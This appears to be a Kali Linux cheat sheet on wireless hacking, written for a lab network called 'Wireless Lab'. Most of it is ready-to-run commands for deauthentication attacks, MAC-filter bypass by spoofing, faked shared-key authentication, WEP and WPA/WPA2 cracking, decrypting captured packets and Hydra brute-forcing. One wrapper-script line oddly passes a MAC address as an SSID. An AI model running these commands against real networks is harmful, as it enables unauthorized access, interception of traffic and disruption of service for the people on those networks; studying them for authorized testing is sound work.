# Wireless Basics in Kali Linux

## View Wireless Devices

To view the wireless devices and confirm the card has been detected:

```sh
ip link
```

## Start or Stop an Access Point

To start or stop an access point and verify the status:

```sh
iw dev ap stop
iw dev ap start
ip link
```

Look for `UP` in the output to confirm the access point is active.

## Bring Wireless Card Up or Down

To bring the wireless card up or down:

```sh
ip link set <device> up
ip link set <device> down
```

For example, to bring the `wlan0` card up:

```sh
ip link set wlan0 up
```

## Verify and Manage Wireless Cards

To verify detection of the card:

```sh
airmon-ng
```

To check for processes that could interfere:

```sh
airmon-ng check
```

To kill those processes:

```sh
airmon-ng check kill
```

To put a device in monitor mode and verify:

```sh
airmon-ng start <device>
airmon-ng stop <device>
```

## Restart Network Services

To restart network services that may have been stopped:

```sh
service NetworkManager start
service wpa_supplicant start
```

## Find Hidden SSID

1. Wait for legitimate ProbeRequests and read out SSID.
2. Find out the MAC address and launch a deauthentication attack to force clients to reconnect and send a Probe Package:

    ```sh
    sudo aireplay-ng -0 5 -a 3C:84:6A:DF:AB:7C --ignore-negative wlan0mon
    ```

    - `-0` specifies a deauthentication attack.
    - `5` is the number of deauthentication packets to send.
    - `-a` specifies the MAC address.

3. Use the following filter in Wireshark to see non-Beacon traffic:

    ```sh
    (wlan.bssid == <MAC>) && !(wlan.fc.type_subtype == 0x08)
    ```

## Orient in Network and Find MAC and Device Type

To capture current networks and clients in the area:

```sh
sudo airodump-ng wlan0mon
```

- Press `a` to navigate through filters.
- To look up a device, go to `sta only`, copy the first 3 hex fields (e.g., `E8:FD:F8`), and paste it into [Wireshark OUI Lookup](https://www.wireshark.org/tools/oui-lookup.html). For example, it might say "Shanghai High-Flying Electronics Technology Co., Ltd."

In `airodump`, press `TAB` to select an AP, use arrow keys to navigate, and press `m` to mark the AP with a color. All clients connected to this AP will have the same color.

Press `s` to sort by attributes like signal strength or MAC address.

To create multiple output files for analysis:

```sh
sudo airodump-ng wlan0mon -w output
```

## Visualize Network Topology with Airgraph-ng

To visualize network topology:

```sh
sudo airgraph-ng -i test-01.csv -o capture.png -g CAPR
```

- `-i` specifies the input CSV file.
- `-o` specifies the output image file.
- `-g` specifies the type of graph output (`CAPR` for client-access point relationship). Other options include `CPG` for common probe graph.

## Beat MAC Filters

To bypass MAC filters:

1. Run `airodump-ng` to find a whitelisted MAC address and spoof it:

    ```sh
    sudo airodump-ng -c 3 -a --bssid 3C:84:6A:DF:AB:7C wlan0mon
    ```

    For example, you might find `A8:93:4A:F2:C1:7D`.

2. Change the MAC address and connect to the network:

    ```sh
    sudo ifconfig wlan0 down
    sudo macchanger -m A8:93:4A:F2:C1:7D wlan0
    sudo ifconfig wlan0 up
    sudo iwconfig wlan0 essid "Wireless Lab"
    ```

    Check if it works by running:

    ```sh
    iwconfig wlan0
    ```

## Bypass Shared Authentication

To sniff packets between AP and client:

```sh
sudo airodump-ng wlan0mon --bssid 3C:84:6A:DF:AB:7C --channel 11 --write keystream
```

Wait for the client to connect or force a reconnect. Look for AUTH column data in `airodump`. 

To fake the shared authentication and connect:

```sh
sudo aireplay-ng -1 0 -e "Wireless Lab" -y keystream-01-3C-84-6A-DF-AB-7C.xor -a 3C:84:6A:DF:AB:7C -h AA:AA:AA:AA:AA:AA wlan0mon
```

To use a wrapper script for multiple attempts:

```sh
chmod +x ddoswrapper.sh
sudo ./ddoswrapper.sh --ssid "AA:AA:AA:AA:AA:AA" --attempts 100
```

Replace `100` with the number of attempts you want.

## Crack WEP

1. Run `airodump-ng` to find the target router's MAC address and channel:

    ```sh
    sudo airodump-ng wlan0mon
    ```

2. Capture data with:

    ```sh
    sudo airodump-ng -c 3 -a --bssid 3C:84:6A:DF:AB:7C wlan0mon --write WEPDemo
    ```

    Replace `3C:84:6A:DF:AB:7C` with the MAC address and `3` with the channel.

3. Replay ARP packets:

    ```sh
    sudo aireplay-ng -3 -b 3C:84:6A:DF:AB:7C -h a8:93:4a:f2:c1:7d --ignore-negative-one wlan0mon
    ```

4. Crack the WEP key:

    ```sh
    aircrack-ng WEPDemo-02.cap
    ```

## Crack WPA/WPA2 Networks Using PSK

1. Find the target router's MAC address and channel:

    ```sh
    sudo airodump-ng wlan0mon
    ```

2. Capture WPA/WPA2 data:

    ```sh
    sudo airodump-ng -c 5 -a --bssid 3C:84:6A:DF:AB:7C wlan0mon --write WPACrackingDemo
    ```

3. Force clients to reconnect or wait for new connections:

    ```sh
    sudo aireplay-ng --deauth 1 -a 3C:84:6A:DF:AB:7C wlan0mon --ignore-negative-one
    ```

4. Crack the WPA/WPA2 passphrase:

    ```sh
    sudo aircrack-ng WPACrackingDemo-01.cap -w /usr/share/wordlists/nmap.lst
    ```

    Use a wordlist that fits your region or known information.

## Speed Up the Cracking Process

1. Precalculate the PMK using `genpmk`:

    ```sh
    sudo genpmk -f /usr/share/wordlists/nmap.lst -d PMK-WirelessLab -s "Wireless Lab"
    ```

2. Crack the WPA/WPA2 passphrase using `cowpatty`:

    ```sh
    cowpatty -d PMK-WirelessLab -s "Wireless Lab" -r WPACrackingDemo-01.cap
    ```

## Decrypt WPA Packets

To decrypt captured WPA packets:

```sh
sudo airdecap-ng -p abcdefgh -e "Wireless Lab" WPACrackingDemo-01.cap
```

The decrypted packets will be saved in `WPACrackingDemo-01-dec.cap` for analysis with Wireshark or `tshark`:

```sh
tshark -r WPACrackingDemo-01-dec.cap
```

## Crack HTTP Authentication with Hydra

1. Create a wordlist:

    ```sh
    sudo crunch 8 8 abcdefghi -o testWordlist.txt
    ```

2. Analyze the webpage to understand how it processes the password (POST or GET request).

3. Use Hydra to crack HTTP authentication with the generated wordlist.